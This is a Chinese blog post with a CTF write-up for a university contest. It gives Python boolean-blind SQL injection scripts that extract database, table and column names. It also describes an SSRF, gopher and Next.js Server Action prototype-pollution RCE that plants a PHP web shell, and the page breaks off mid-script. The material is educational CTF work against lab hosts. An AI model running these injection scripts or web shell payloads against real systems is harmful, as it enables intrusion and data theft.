@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-50x50.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-50x50.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="theme-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ducklinger.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="注注need​	登录界面发现存在，密码错误和用户名不存在为页面回显区别的布尔盲注，随后编写脚本爆破数据库名ctf_challenge，表名password继续爆破得到admin登录密码 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ducklinger">
+<meta property="og:url" content="https://ducklinger.top/2026/06/01/CTF/WHUCTF2026%E6%A0%A1%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Ducklinger">
+<meta property="og:description" content="注注need​	登录界面发现存在，密码错误和用户名不存在为页面回显区别的布尔盲注，随后编写脚本爆破数据库名ctf_challenge，表名password继续爆破得到admin登录密码 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419102152.png">
+<meta property="og:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419102015.png">
+<meta property="og:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419140340.png">
+<meta property="og:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419135754.png">
+<meta property="og:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419143127.png">
+<meta property="article:published_time" content="2026-06-01T06:51:58.260Z">
+<meta property="article:modified_time" content="2026-06-01T06:51:58.262Z">
+<meta property="article:author" content="Ducklinger">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\15292\Desktop\ctf\%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20260419102152.png">
+
+<link rel="canonical" href="https://ducklinger.top/2026/06/01/CTF/WHUCTF2026%E6%A0%A1%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Ducklinger</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ducklinger</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section">关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section">分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section">标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">归档</a>
+
+  </li>
+        <li class="menu-item menu-item-poems">
+
+    <a href="/poems/" rel="section">诗歌</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main main-post">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ducklinger.top/2026/06/01/CTF/WHUCTF2026%E6%A0%A1%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Ducklinger">
+      <meta itemprop="description" content="分享日常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ducklinger">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-06-01 14:51:58" itemprop="dateCreated datePublished" datetime="2026-06-01T14:51:58+08:00">2026-06-01</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="注注need"><a href="#注注need" class="headerlink" title="注注need"></a>注注need</h2><p>​	登录界面发现存在，密码错误和用户名不存在为页面回显区别的布尔盲注，随后编写脚本爆破数据库名ctf_challenge，表名password继续爆破得到admin登录密码</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:59913/login&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># 构造请求数据，假设注入点在用户名</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;processed_payload&#125;</span>#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;any_password&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># 根据你的测试，回显“密码错误”表示 SQL 逻辑成立</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():</span><br><span class="line">    db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破数据库名...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 假设数据库名长度不超过 20</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 遍历可见 ASCII 字符范围 (32-126)</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            <span class="comment"># 构造 SQL: ascii(substr(database(), i, 1)) &gt; mid</span></span><br><span class="line">            payload = <span class="string">f&quot;ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> inject(payload):</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        char = <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="keyword">if</span> low == <span class="number">32</span> <span class="keyword">or</span> low &gt; <span class="number">126</span>:  <span class="comment"># 如果没找到或结束了</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        db_name += char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 正在提取: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = get_database_name()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 最终爆破结果: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:51531/login&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># 依然保留 /**/ 绕过空格，这是为了保险</span></span><br><span class="line">    processed_payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;processed_payload&#125;</span>#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;any_password&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># 只要逻辑成立，回显“密码错误”</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_columns</span>():</span><br><span class="line">    columns = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破 users 表的列名...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 外层循环：爆破第几个列</span></span><br><span class="line">    <span class="keyword">for</span> col_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 内层循环：爆破列名的每一个字符</span></span><br><span class="line">        <span class="keyword">for</span> char_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">            low, high = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line">            <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">                mid = (low + high) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 标准字符匹配：table_name=&#x27;users&#x27; 且 table_schema=&#x27;ctf_challenge&#x27;</span></span><br><span class="line">                <span class="comment"># 注意：Python 字符串里嵌套单引号要小心，这里用了 f-string 和不同引号</span></span><br><span class="line">                payload = <span class="string">f&quot;ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;ctf_challenge&#x27; limit <span class="subst">&#123;col_idx&#125;</span>,1),<span class="subst">&#123;char_idx&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> inject(payload):</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            char = <span class="built_in">chr</span>(low)</span><br><span class="line">            <span class="comment"># 如果爆破出来是空字符或不可见字符，说明这一列的名字跑完了</span></span><br><span class="line">            <span class="keyword">if</span> low &lt;= <span class="number">32</span> <span class="keyword">or</span> low &gt; <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            column_name += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 正在提取第 <span class="subst">&#123;col_idx + <span class="number">1</span>&#125;</span> 列: <span class="subst">&#123;column_name&#125;</span>&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> column_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 列名提取完毕，共找到 <span class="subst">&#123;<span class="built_in">len</span>(columns)&#125;</span> 个字段。&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        columns.append(column_name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 发现列名: <span class="subst">&#123;column_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cols = get_columns()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 最终列名结果: <span class="subst">&#123;cols&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:59913/login&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># 复用你的逻辑：空格转 /**/ 绕过</span></span><br><span class="line">    processed_payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;processed_payload&#125;</span>#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;any_password&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>():</span><br><span class="line">    tables = []</span><br><span class="line">    database_name = <span class="string">&quot;ctf_challenge&quot;</span>  <span class="comment"># 你刚才爆破出来的结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 开始爆破数据库 [<span class="subst">&#123;database_name&#125;</span>] 中的表名...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 假设最多有 10 张表</span></span><br><span class="line">    <span class="keyword">for</span> table_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 假设每个表名长度不超过 30</span></span><br><span class="line">        <span class="keyword">for</span> char_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">            low = <span class="number">32</span></span><br><span class="line">            high = <span class="number">126</span></span><br><span class="line">            found_char = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">                mid = (low + high) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 核心 SQL 逻辑：从 information_schema.tables 中按索引取表名</span></span><br><span class="line">                payload = <span class="string">f&quot;ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database_name&#125;</span>&#x27; limit <span class="subst">&#123;table_idx&#125;</span>,1),<span class="subst">&#123;char_idx&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> inject(payload):</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            char = <span class="built_in">chr</span>(low)</span><br><span class="line">            <span class="comment"># 如果爆破出 的 字符不在可见范 围内，说明当前表名提取结束</span></span><br><span class="line">            <span class="keyword">if</span> low &lt;= <span class="number">32</span> <span class="keyword">or</span> low &gt; <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            table_name += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 正在提取第 <span class="subst">&#123;table_idx + <span class="number">1</span>&#125;</span> 张表: <span class="subst">&#123;table_name&#125;</span>&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> table_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 所有表名提取完毕，共找到 <span class="subst">&#123;<span class="built_in">len</span>(tables)&#125;</span> 张表。&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        tables.append(table_name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 发现表: <span class="subst">&#123;table_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    table_list = get_tables()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 最终表名列表: <span class="subst">&#123;table_list&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hell-City"><a href="#Hell-City" class="headerlink" title="Hell City"></a>Hell City</h2><p>根据提示使用ssrf + gopher协议 + CVE-2025-55182原型链污染rce + 回显写入地址（&#x2F;var&#x2F;www&#x2F;html）</p>
+<p>输入<a target="_blank" rel="noopener" href="http://127.0.0.1以及看到的/api/health%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%BA%9B%E9%9D%B6%E6%9C%BA%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E7%A1%AE%E8%AE%A4%E4%BA%86%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84">http://127.0.0.1以及看到的/api/health可以看到一些靶机的信息，确认了存在漏洞的</a> Next.js 服务运行在内网的 <strong>80 端口</strong>，且处于 Docker 容器环境中</p>
+<p>了解了一下这个漏洞<a target="_blank" rel="noopener" href="https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/">https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/</a> 就是说当 Next.js 处理 Server Action 的 <code>multipart/form-data</code> 请求时，会使用 React Flight 协议解析数据，就可以通过构造 <code>[&quot;$1:__proto__:then&quot;]</code> 这样的路径，攻击者可以沿着 JavaScript 的原型链向上遍历攻击者利用这个特性，劫持了 <code>Chunk.prototype.then</code>（控制流引擎）和 <code>Chunk.constructor.constructor</code>最终，当 React 引擎尝试解析一个特定的 Blob 引用（如 <code>$B1337</code>）时，会将恶意的 Payload 字符串传入 <code>Function(...)</code> 中执行，完成 RCE（博客里面说的）</p>
+<p>OK现在就可以构造payload了</p>
+<p>RCE部分的payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let res = arguments[0]; </span><br><span class="line">let rej = arguments[1]; </span><br><span class="line">import(&quot;fs&quot;).then(fs =&gt; &#123;</span><br><span class="line">    fs.writeFileSync(&quot;/var/www/html/a.php&quot;, &quot;&lt;?php system($_GET[\&quot;a\&quot;]); ?&gt;&quot;);</span><br><span class="line">    res(&quot;pwned&quot;);</span><br><span class="line">&#125;).catch(rej); //</span><br></pre></td></tr></table></figure>
+
+<p>相当于执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(&#x27;let res = arguments[0]; let rej = arguments[1]; import(&quot;fs&quot;).then(fs =&gt; &#123; fs.writeFileSync(&quot;/var/www/html/a.php&quot;, &quot;&lt;?php system($_GET[\\&quot;a\\&quot;]); ?&gt;&quot;); res(&quot;pwned&quot;); &#125;).catch(rej); //4919&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后这个生成的匿名函数被赋值给了 <code>chunk.value</code> 的 <code>then</code> 属性。 此时，<code>chunk.value</code> 变成了一个包含恶意 <code>then</code> 方法的对象</p>
+<p>然后再用脚本生成完整的gopher payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> 